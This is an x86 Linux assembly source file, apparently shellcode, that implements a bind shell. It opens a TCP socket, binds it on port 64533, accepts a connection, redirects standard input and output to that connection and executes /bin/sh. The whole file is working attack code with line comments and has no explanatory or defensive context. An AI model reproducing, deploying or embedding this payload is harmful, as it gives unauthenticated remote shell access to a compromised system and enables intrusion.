global _start
section .text
_start:
    push byte +0x66     ; SYS_SOCKETCALL 
    push byte +0x1      ; SOCKET
    pop ebx             ; Load subcall
    pop eax             ; Load syscall
    cdq                 ; Clear EDX

    push edx            ; Protocol arg (0)
    push byte +0x1      ; SOCK_STREAM
    push byte +0x2      ; AF_INET
    mov ecx,esp         ; Save argument pointer -> ECX
    int 0x80            ; Exec interrupt
    mov esi,eax         ; Save returned FD -> ESI
    
    push byte +0x66     ; SYS_SOCKETCALL
    pop eax             ; Load syscall
    inc ebx             ; EBX -> BIND
    push edx            ; Bind to addr 0.0.0.0
    push word 0x15fc    ; Bind to port 64533
    push bx             ; AF_INET
    mov ecx,esp         ; Save sockaddr_in pointer -> ECX
    push byte +0x10     ; sockaddr_in length: 16
    push ecx            ; Push sockaddr_in pointer
    push esi            ; Push socket FD
    mov ecx,esp         ; Save argument pointer -> ECX
    int 0x80            ; Exec interrupt

    push byte +0x66     ; SYS_SOCKETCALL
    pop eax             ; Load syscall
    inc ebx             ; 2 -> 3
    inc ebx             ; 3 -> 4 (LISTEN)
    push byte +0x5      ; Queue length: 5
    push esi            ; Push socket FD
    int 0x80            ; Exec interrupt

    push byte +0x66     ; SYS_SOCKETCALL
    pop eax             ; Load syscall
    inc ebx             ; 4 -> 5 (ACCEPT)
    push edx            ; Length of new sockaddr_in
    push edx            ; New sockaddr_in placeholder
    push esi            ; Push socket FD
    mov ecx,esp         ; Save argument pointer -> ECX
    int 0x80            ; Exec interrupt

    mov ebx,eax         ; Move connected socket FD to EBX
    push byte +0x3f     ; DUP2
    pop eax             ; Load syscall
    xor ecx,ecx         ; Clear ECX
    int 0x80            ; Exec interrupt

    push byte +0x3f     ; DUP2
    pop eax             ; Load syscall
    inc ecx             ; 0 -> 1
    int 0x80            ; Exec interrupt

    xor eax,eax         ; Clear EAX
    push eax            ; Push null terminator
    push dword 0x68732f2f   ; //sh
    push dword 0x6e69622f   ; /bin
    mov ebx,esp         ; Save argument pointer -> EBX
    cdq                 ; Clear EDX
    push eax            ; Push 0
    mov al,0xb          ; EXECVE 
    pop ecx             ; Clear ECX
    int 0x80            ; Exec interrupt
